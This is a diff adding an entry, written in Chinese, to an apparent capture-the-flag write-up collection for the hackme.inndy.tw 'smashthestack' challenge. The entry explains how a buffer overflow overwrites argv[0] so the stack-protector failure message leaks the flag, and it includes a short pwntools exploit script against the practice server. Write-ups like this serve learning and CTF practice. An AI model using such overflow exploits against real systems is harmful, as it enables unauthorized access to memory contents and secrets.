@@ -1116,6 +1116,20 @@ def main():
     r.interactive()
 ```
 
+## 67 smashthestack
+這題是利用了 __stack_chk_fail function 顯示錯誤訊息時，會顯示出 argv[0] 的特性，因此可以透過 buffer overflow 的方式，把值蓋成 flag 的地址，這樣在顯示錯誤訊息的時候就會噴出 flag 了。
+不過這只在特定的 lib 版本有效就是了。
+
+```python=
+r = remote('hackme.inndy.tw',7717)
+r.recvuntil(b'Try to read the flag\n')
+target_abbr = 0x0804a060
+p = p32(target_abbr) * 0x300
+
+r.send(p)
+r.interactive()
+```
+
 ## 70 rsbo
 這題進行 read 時長度設為 0x80，但 buffer 長度只有 80，因此可以進行 bof，但 bof 長度不夠，可以透過 Stack Migration 的方式增加 ROPchain 的長度
 
